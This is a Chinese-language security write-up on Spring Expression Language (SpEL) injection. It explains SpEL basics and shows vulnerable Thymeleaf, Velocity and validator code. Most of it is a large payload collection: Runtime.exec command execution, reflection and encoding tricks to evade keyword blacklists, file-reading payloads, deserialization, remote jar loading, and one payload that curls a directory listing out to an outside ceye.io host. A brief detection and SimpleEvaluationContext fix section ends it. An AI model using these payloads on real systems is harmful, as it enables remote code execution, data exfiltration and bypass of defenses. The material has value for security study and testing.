# SpEL表达式注入
# SpEL简介
在Spring 3中引入了Spring表达式语言（Spring Expression Language，简称SpEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于XML和基于注解的Spring配置还有bean定义一起使用。
## SpEL定界符
SpEL使用```#{}```作为定界符，所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等。这里需要注意#{}和${}的区别：
* ```#{}```就是SpEL的定界符，用于指明内容未SpEL表达式并执行；
* ```${}```主要用于加载外部属性文件中的值；
* 两者可以混合使用，但是必须```#{}```在外面，```${}```在里面，如```#{'${}'}```，注意单引号是字符串类型才添加的；
## SpEL表达式类型
### 字面值
最简单的SpEL表达式就是仅包含一个字面值, 注意若是指定为字符串的话需要添加单引号括起来,Java基本数据类型都可以出现在SpEL表达式中。
```xml
<!--数字-->
<property name="message1" value="#{996}"/>
<!--字符-->
<property name="message2" value="#{'hello world'}"/>
<property name="salary" value="#{1e4}"/>
<!--与字符串混用-->
<property name="message" value="the value is #{996}"/>
```
### 引用Bean、属性和方法
```xml
类属性
#{Person.name}
类方法
#{Person.HelloWorld()}
函数
#{'Guoke'.toLowerCase()}
异常处理: ?.符号会确保左边的表达式不会为null，如果为null的话就不会调用toUpperCase()方法了
#{Person.HelloWorld()?.toUpperCase()}
```
### 类类型表达式T(Type)
在SpEL表达式中，使用T(Type)运算符会调用类的作用域和方法。换句话说，就是可以通过该类类型表达式来操作类。使用T(Type)来表示java.lang.Class实例，Type必须是类全限定名，但”java.lang”包除外，因为SpEL已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段。
在XML配置文件中的使用示例，要调用java.lang.Math来获取0~1的随机数：
```xml
<property name="random" value="#{T(java.lang.Math).random()}"/>
```
## SpEL用法
SpEL的用法有三种形式，一种是在注解@Value中；一种是XML配置；最后一种是在代码块中使用Expression。
### XML配置用法
前面的就是以XML配置为例对SpEL表达式的用法进行的说明；
### 注解用法
而注解@Value的用法例子如下：
```java
public class EmailSender {
    @Value("${spring.mail.username}")
    private String mailUsername;
    @Value("#{ systemProperties['user.region'] }")    
    private String defaultLocale;
    //...
}
```
### 代码中使用Expression
SpEL 在求表达式值时一般分为四步，其中第三步可选：首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。
```java
// 创建解析器：SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现；
ExpressionParser parser = new SpelExpressionParser();
// 解析表达式：使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象；
Expression expression = parser.parseExpression("('Hello' + ' world').concat(#end)");
// 构造上下文：准备比如变量定义等等表达式需要的上下文数据；
EvaluationContext context = new StandardEvaluationContext();
context.setVariable("end", "!");
//求值：通过 Expression 接口的 getValue 方法根据上下文获得表达式值；
System.out.println(expression.getValue(context));
// 输出： Hello world!
```
主要接口
* ExpressionParser 接口：表示解析器，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpressionParser 类，使用 parseExpression 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符；
* EvaluationContext 接口：表示上下文环境，默认实现是 org.springframework.expression.spel.support 包中的 StandardEvaluationContext 类，使用 setRootObject 方法来设置根对象，使用 setVariable 方法来注册自定义变量，使用 registerFunction 来注册自定义函数等等。
* Expression 接口：表示表达式对象，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpression，提供 getValue 方法用于获取表达式值，提供 setValue 方法用于设置对象值。

# SpEL表达式注入漏洞
漏洞原理
SimpleEvaluationContext和StandardEvaluationContext是SpEL提供的两个EvaluationContext：
* SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。
* StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。

SimpleEvaluationContext旨在仅支持SpEL语言语法的一个子集，不包括 Java类型引用、构造函数和bean引用；而StandardEvaluationContext是支持全部SpEL语法的。
由前面知道，SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)来调用任意类方法。这是因为在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。
## Thymeleaf模板注入分析
参考：https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/
```java
//GET /path?lang=en HTTP/1.1
//GET /path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x
@GetMapping("/path")
public String path(@RequestParam String lang) {
    return "user/" + lang + "/welcome"; //template path is tainted
}

// thymeleaf 在解析包含 :: 的模板名时，会将其作为表达式去进行执行
//GET /fragment?section=main
//GET /fragment?section=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x
@GetMapping("/fragment")
public String fragment(@RequestParam String section) {
    return "welcome :: " + section; //fragment is tainted
}

//如果controller无返回值，则以GetMapping的路由为视图名称。当然，对于每个http请求来讲，其实就是将请求的url作为视图名称，调用模板引擎去解析.
// /doc/__$%7BT(java.lang.Runtime).getRuntime().exec("calc")%7D__::.x
@GetMapping("/doc/{document}")
public void getDocument(@PathVariable String document) {
    log.info("Retrieving " + document);
    //returns void, so view name is taken from URI
}
```
正确使用方式：
```java
// 设置ResponseBody注解,如果设置ResponseBody，则不再调用模板解析
@GetMapping("/safe/fragment")
@ResponseBody
public String safeFragment(@RequestParam String section) {
    return "welcome :: " + section; //FP, as @ResponseBody annotation tells Spring to process the return values as body, instead of view name
}

//设置redirect重定向，如果名称以redirect:开头，则不再调用ThymeleafView解析，调用RedirectView去解析controller的返回值
@GetMapping("/safe/redirect")
public String redirect(@RequestParam String url) {
    return "redirect:" + url; //FP as redirects are not resolved as expressions
}

//由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析
@GetMapping("/safe/doc/{document}")
public void getDocument(@PathVariable String document, HttpServletResponse response) {
    log.info("Retrieving " + document); //FP
}
// 其他
<div th:fragment="main">
    <span th:text="'Hello, ' + ${message}"></span>
    <a th:href="@{__${message}__}" th:title="${message}">
</div>
```
## SSTI of Java velocity
```java
// /velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc.exe%22)
@GetMapping("/velocity")
public void velocity(String template) {
    Velocity.init();
    VelocityContext context = new VelocityContext();
    context.put("author", "Elliot A.");
    context.put("address", "217 E Broadway");
    context.put("phone", "555-1337");
    StringWriter swOut = new StringWriter();
    Velocity.evaluate(context, swOut, "test", template);
}
```
## ConstraintValidatorContext.buildConstraintViolationWithTemplate
实体User类
```java
public class User implements Serializable {
    @UserValidator
    private String username;
    private String password;
    private String id;
}
```
UserCheck类
```java
public class UserCheck implements ConstraintValidator<UserValidator, String> {
    private static final Pattern mail_pattern = Pattern.compile("^\\s*\\w+(?:\\.{0,1}[\\w-]+)*@[a-zA-Z0-9]+(?:[-.][a-zA-Z0-9]+)*\\.[a-zA-Z]+\\s*$");
    public boolean isValid(String mail, ConstraintValidatorContext constraintValidatorContext) {
        if (StringUtils.isEmpty(mail))
            return false;
        Matcher m = mail_pattern.matcher(mail);
        if (m.matches())
            return true;
        constraintValidatorContext.disableDefaultConstraintViolation();
        //错误的将用户输入的信息带入构建模板中，导致SPEL表达式的注入。
        constraintValidatorContext.buildConstraintViolationWithTemplate("mail not exist: " + mail).addConstraintViolation();
        return false;
    }

    public void initialize(UserValidator constraintAnnotation) {}
}
```
UserValidator类
```java
import javax.validation.Constraint;
import javax.validation.Payload;
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

@Target({ElementType.METHOD, ElementType.FIELD, ElementType.ANNOTATION_TYPE, ElementType.CONSTRUCTOR, ElementType.PARAMETER})
@Retention(RetentionPolicy.RUNTIME)
@Constraint(validatedBy = {UserCheck.class})
public @interface UserValidator {
    String message() default "error user";

    Class<?>[] groups() default {};

    Class<? extends Payload>[] payload() default {};
}
```
```java
@PostMapping({"/signup"})
public String signupPost(@Valid @ModelAttribute("user") User user, BindingResult bindingResult, Model model) {
    if (bindingResult.hasErrors()) {
        model.addAttribute("erroremail", Boolean.valueOf(true));
        return "signup";
    }
    return "redirect:/";
}
```
SPEL执行命令：
```
POST /valid/signup HTTP/1.1
Host: www.test.com:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 185

username=${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('calc')")}&password=123&id=121
```
# SPEL Payload
## 常见payload
```java
${12*12}
T(Thread).sleep(10000)
T(java.lang.Runtime).getRuntime().exec("calc.exe")
// 同上，需要有上下文环境，EvaluationContext context = new StandardEvaluationContext("test");
#this.getClass().forName("java.lang.Runtime").getRuntime().exec("calc")
new java.lang.ProcessBuilder({'calc'}).start()
//列目录
#{T(java.util.Arrays).toString(T(java.nio.file.Files).list(T(java.nio.file.Paths).get('c:\\')).toArray())}
//读文件
new java.util.Scanner(new java.io.File('D:/logs/test.txt')).next()
#{T(org.apache.commons.io.FileUtils).readFileToString(new java.io.File("c:\\1.txt"))}
#{NEW java.util.Scanner(NEW java.io.BufferedReader(NEW java.io.FileReader(NEW java.io.File('/flag')))).nextLine()}
#{New java.io.BufferedReader(New java.io.FileReader("/flag")).readLine()}
#{T(java.nio.file.Files).lines(T(java.nio.file.Paths).get('c:\\1.txt')).findFirst().toString()}
#{T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get("D:/logs/test.txt"))}
```
## 反射调用
```java
// 反射调用+字符串拼接，关键字拆分
T(String).getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('ex'+'ec',T(String[])).invoke(T(String).getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('getRu'+'ntime').invoke(T(String).getClass().forName('java.la'+'ng.Ru'+'ntime')), new String[]{'cmd.exe','/c','calc'})
// 同上，需要有上下文环境
#this.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})
// ProcessBuilder
#{(T(String).getClass().forName("java.la"+"ng.ProcessBuilder").getConstructor('foo'.split('').getClass()).newInstance(new String[]{'calc.exe'})).start()}
// exec
T(String).getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('ex'+'ec',T(String[])).invoke(T(String).getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('getRu'+'ntime').invoke(T(String).getClass().forName('java.la'+'ng.Ru'+'ntime')), new String[]{'/bin/bash','-c','curl http://abcdef.ceye.io/`cd / && ls|base64|tr \"\n\" \"-\"`'})
```
## 关键字绕过
```java
//byte数组内容生成
new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()
T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))
```
用于String类动态生成字符的字符ASCII码转换生成:
```python
message = input('Enter message to encode:')
print('Decoded string (in ASCII):\n')
print('T(java.lang.Character).toString(%s)' % ord(message[0]), end="")
for ch in message[1:]:
   print('.concat(T(java.lang.Character).toString(%s))' % ord(ch), end=""), 
print('\n')

print('new java.lang.String(new byte[]{', end=""),
print(ord(message[0]), end="")
for ch in message[1:]:
   print(',%s' % ord(ch), end=""), 
print(')}')
```
## JavaScript引擎通用PoC
```java
T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval("xxx"),)
//JavaScript引擎+反射调用
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})),)
//JavaScript引擎+URL编码
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(java.net.URLDecoder).decode("%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29")),)
```
## 黑名单过滤".getClass("，未测试成功
```java
''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),new String[]{'cmd','/c','calc'})
''.class.forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''.class.forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),new String[]{'cmd','/c','calc'})
```
## JDK9新增的shell
```java
T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass("jdk.jshell.JShell",true).Methods[6].invoke(null,{}).eval('whatever java code in one statement').toString()
```
## 利用反序列化
```java
#{T(org.springframework.util.SerializationUtils).deserialize(T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('rO0AB........'))}
//通spring内置的一个方法。 输入类名，字节码，classload就可以new一个类。当类中有static方法的时候。new类就会自动触发
T(org.springframework.cglib.core.ReflectUtils).defineClass('Singleton',T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('yv66vgAAADIAtQ....'),T(org.springframework.util.ClassUtils).getDefaultClassLoader())
```
## 利用request传值。绕过黑名单
```java
[[${#this.getClass().getClassLoader().loadClass(#request.getHeader(111)).getDeclaredMethod(#request.getHeader(222),
#this.getClass().getClassLoader().loadClass(#request.getHeader(333))).invoke(#this.getClass().getClassLoader().loadClass(#request.getHeader(111)).getDeclaredMethod(#request.getHeader(444)).invoke(null),
#request.getParameter(1))}]]
```
## URLClassloader
```java
New java.net.URLClassLoader(New java.net.URL[]{New java.net.URL("http://xxxx/xxx.jar"}).getDeclaredMethod("exec").invoke(null)
```
## 回显
```java
// 其次如果有输出点需要回显可以使用
T(org.apache.commons.io.IOUtils).toString(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).....).getInputStream())
T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(%27cmd%20/c%20dir%27).getInputStream())
```
## 其他绕过方式（如：%00等骚姿势绕过）
```java
T\x00(java.net.URLClassLoader).getSystemClassLoader().loadClass("java.nio.file.Files").readAllLines(T\x00(java.net.URLClassLoader).getSystemClassLoader().loadClass("java.nio.file.Paths").get("d:/logs/test.txtg"))
''.class.forName('java.nio.file.Files').getDeclaredMethods()[17].invoke(null,''.class.forName('java.nio.file.Paths').getDeclaredMethods()[0].invoke(null,'d:/logs/test.txt',''.class.forName('jav'+'a.lang.'+'Str'+'ing').getDeclaredMethods()[63].invoke('','a')))
T\x00(java.nio.file.Files).readAllLines(T\x00(java.nio.file.Paths).get('d:/logs/test.txt'),T\x00(java.nio.charset.Charset).defaultCharset())
T%00(java.nio.file.Files).readAllLines(T%00(java.nio.file.Paths).get(%27d:/logs/test.txt%27),T%00(java.nio.charset.Charset).defaultCharset())
```
## 其他的一些payload
```xml
${pageContext} // 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。）
${pageContext.getSession().getServletContext().getClassLoader().getResource("")} // 获取web路径
${header} // 文件头参数
${applicationScope} // 获取webRoot
${pageContext.request.getSession().setAttribute("a",pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("命令").getInputStream())} // 执行命令
<p th:text="${#this.getClass().forName('java.lang.System').getProperty('user.dir')}"></p>   //获取web路径
```
# 检测与防御
全局搜索关键特征：
```java
//关键类
org.springframework.expression.Expression
org.springframework.expression.ExpressionParser
org.springframework.expression.spel.standard.SpelExpressionParser
//调用特征
ExpressionParser parser = new SpelExpressionParser();
Expression expression = parser.parseExpression(str);
expression.getValue()
```
最直接的修复方法是使用SimpleEvaluationContext替换StandardEvaluationContext。
```java
String spel = "T(java.lang.Runtime).getRuntime().exec(\"calc\")";
ExpressionParser parser = new SpelExpressionParser();
Student student = new Student();
EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(student).build();
Expression expression = parser.parseExpression(spel);
System.out.println(expression.getValue(context));
```
# 参考
http://rui0.cn/archives/1043<br>
https://guokeya.github.io/post/413GsNWtr/<br>
https://mrbird.cc/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F.html<br>
https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/<br>
https://aluvion.github.io/2019/04/25/Java%E7%89%B9%E8%89%B2-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/<br>
https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html